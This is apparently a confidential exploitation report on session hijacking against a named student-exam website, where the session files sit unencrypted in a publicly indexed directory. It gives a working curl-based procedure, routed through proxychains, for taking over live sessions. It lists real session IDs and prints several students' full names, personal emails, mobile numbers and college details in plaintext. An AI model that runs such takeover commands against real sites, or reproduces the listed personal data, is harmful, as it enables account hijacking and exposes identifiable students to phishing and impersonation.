# 👥 Session Hijacking & PII Forensic Analysis
**Classification:** CONFIDENTIAL — Personally Identifiable Information Audit  
**Target:** `https://student.citexams.in/storage/framework/sessions/`  

---

## 1. Session Mechanism & Architecture

The application uses Laravel file-based sessions configured with `SESSION_ENCRYPT=false`. Due to Apache directory indexing being active on `/storage/framework/sessions/`, all active sessions are publicly discoverable and downloadable without authentication.

### Cookie Specifications
* **Cookie Name:** `citexams_student_session`
* **Security Attributes:** `Secure: True`, `HttpOnly: True`, `SameSite: Lax`
* **Storage Location:** `/home/bookleeycit/public_html/student.citexams.in/storage/framework/sessions/<SESSION_ID>`
* **Format:** Unencrypted PHP serialized string (`a:22:{...}`)

---

## 2. Session Payload & Extracted PII Breakdown

Analysis of active live sessions (e.g. `k37ZUSs0YJY6Dc1CebMpAL9ctU6y3yjZUfBtuMEh`) revealed 22 distinct internal profile attributes:

| Field Name | Type | Value (Sample) | Security / Privacy Impact |
|---|---|---|---|
| `student_name` | String | `PHIL NELSON GEORGE` | Full Legal Identity Leak |
| `email` | String | `philnelsongeorge@gmail.com` | Personal Email Exposure |
| `mobile_no` | String | `8310514579` | Direct Contact / Phishing Vector |
| `student_id` | Integer | `3772` | Internal Primary Key |
| `customer_id` | Integer | `4456` | Authentication Identity Key |
| `college_name` | String | `Cambridge Institute of Technology` | Academic Affiliation |
| `stream_name` | String | `Bachelor of Engineering` | Degree Stream |
| `branch_name` | String | `Electronics and Communication Engineering` | Academic Branch |
| `class_name` | String | `Second Semester` | Class / Semester |
| `customer_image`| String | `4456-student-photo.jpg` | Facial Photograph Reference |
| `_token` | String | `k37ZUSs0YJY6Dc1CebMpAL9ctU6y3yjZUfBtuMEh` | CSRF Token Extraction |
| `college_id` | Integer | `1` | Multi-Tenant Identifier |
| `db_year` | String | `2025 - 2026` | Active Database Connection Context |

---

## 3. Zero-Interaction Takeover Procedure

```bash
# 1. Fetch live session list
SESSION_ID=$(proxychains4 curl -sk https://student.citexams.in/storage/framework/sessions/ | grep -oP 'href="[A-Za-z0-9]{40}"' | head -1 | cut -d'"' -f2)

# 2. Inject cookie into HTTP request
proxychains4 curl -sk https://student.citexams.in/dashboard \
  -H "Cookie: citexams_student_session=${SESSION_ID}" \
  -o student_dashboard.html
```

---

## APPENDIX A — LIVE VERIFICATION EVIDENCE (2026-08-31)

### A1. Session Directory — Unauthenticated Access Confirmed
```
Command:  proxychains4 curl -sk -w "HTTP_STATUS:%{http_code} SIZE:%{size_download}" https://student.citexams.in/storage/framework/sessions/
Response: HTTP_STATUS:200 SIZE:31923
Total active session IDs enumerated: 148
```

### A2. Authenticated Session File — Real PII Extracted
```
Session ID: 006MImjb8lURhHEu2kORxeXYK0ZDHEwPbVlgWGZx
Command:    proxychains4 curl -sk https://student.citexams.in/storage/framework/sessions/006MImjb8lURhHEu2kORxeXYK0ZDHEwPbVlgWGZx
Response:   HTTP_STATUS:200

Raw content (PHP serialized, unencrypted):
a:22:{
  s:6:"_token";s:40:"M7KmFBM6KHmqiqCfB8a4yPWa4rAUvj7jRorXPVff";
  s:16:"isStudentSession";i:1;
  s:11:"customer_id";i:4773;
  s:10:"student_id";i:4085;
  s:12:"student_name";s:17:"VEDANTH M CHANDRA";
  s:5:"email";s:23:"vedanthrishi6@gmail.com";
  s:9:"mobile_no";s:10:"9980981345";
  s:6:"gender";s:4:"Male";
  s:14:"customer_image";s:22:"4773-student-photo.jpg";
  s:8:"userRole";s:7:"Student";
  s:10:"college_id";i:1;
  s:12:"college_name";s:33:"Cambridge Institute of Technology";
  s:11:"stream_name";s:23:"Bachelor of Engineering";
  s:11:"branch_name";s:38:"Electrical and Electronics Engineering";
  s:10:"class_name";s:15:"Second Semester";
  s:7:"db_year";s:11:"2025 - 2026";
}
```
**PII CONFIRMED:** Full name, personal email, mobile number, branch, photo filename — all in plaintext.  
Raw file: `poc_artifacts/evidence/raw/authed_session.txt`

### A3. Additional Session IDs Enumerated (first 10 of 148)
```
0VOB0Mkm3FlCozQsokq9szsGdchTVvU50wtneshl
006MImjb8lURhHEu2kORxeXYK0ZDHEwPbVlgWGZx  ← VEDANTH M CHANDRA (verified)
09OiVIpQGOh6Ns5J3TVYnWqZ1FHoftkIIlvuOBZs
1FuFnbS4Kxtq5Q4CrMp8hPLlaiBNVwp607tEYTgR
1bqbS867VUE0SoZZ4stZgfGyDdCUJ6XJAZ1HQF12
2BR4XwuHcs4Gge3jlBeQsTp1GYNJpdMIcZvcAzQl
2sE7reKZ97dtBOVRt830KGqSxKegBoGNasLI042v
3hmQQovTbVNddai7C4WZ3yLy3SyYu6lMtH5i3sIu
4GBtVBo9d5sQGo87p3wI0UnZuYtqKRo566FevQKF
4OW2HhhEZw8dSCAnRX728yXOICjSzafdNWDRJtvs
```
Full listing: `poc_artifacts/evidence/raw/sessions_listing.txt` (31,923 bytes)
